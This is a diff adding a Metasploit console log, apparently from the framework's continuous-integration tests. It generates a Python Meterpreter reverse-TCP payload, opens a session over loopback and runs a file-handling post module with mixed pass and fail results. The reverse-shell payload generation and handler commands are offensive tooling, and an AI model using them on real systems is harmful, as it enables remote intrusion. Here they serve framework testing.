@@ -1,0 +1,51 @@
+use python/meterpreter_reverse_tcp
+generate -o D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-1876-1chvjgg.py -f raw MeterpreterTryToFork=false lport=6003 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> [*] Writing 115725 bytes to D:/a/_temp/meterpreter-spec-rb-python-meterpreter-reverse-tcp20220119-1876-1chvjgg.py...
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 2
+[4mmsf6[0m payload([1m[31mpython/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6003 
+[*] Meterpreter session 3 opened (127.0.0.1:6003 -> 127.0.0.1:50053 ) at 2022-01-19 00:53:35 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=3 addentropy=true verbose=true
+
+[*] Setup: changing working directory to %TEMP%
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 3
+[*] Session type is meterpreter and platform is windows
+[-] FAILED: should test for directory existence
+[*] Creating directory test-dir
+[*] test-dir created
+[-] FAILED: should create directories
+[-] FAILED: should list the directory we just made
+[+] should recursively delete the directory we just made
+[*] Creating directory test-dir
+[*] test-dir created
+[-] FAILED: should delete a symbolic link target
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_sys_process_execute: Operation failed: Python exception: FileNotFoundError
+[*] Creating directory test-dir.1
+[*] test-dir.1 created
+[*] Creating directory test-dir.2
+[*] test-dir.2 created
+[-] FAILED: should not recurse into symbolic link directories
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_sys_process_execute: Operation failed: Python exception: FileNotFoundError
+[-] FAILED: should test for file existence
+[-] FAILED: should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[-] Post failed: Errno::ENOENT No such file or directory @ rb_sysopen - /bin/echo
+[-] Call stack:
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/file.rb:214:in `read'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/modules/post/test/file.rb:214:in `test_binary_files'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:18:in `block in run_all_tests'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `each'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:17:in `run_all_tests'
+[-]   D:/a/metasploit-framework/metasploit-framework/test/lib/module_test.rb:57:in `run'
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Cleanup: changing working directory back to D:/a/metasploit-framework/metasploit-framework
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> 
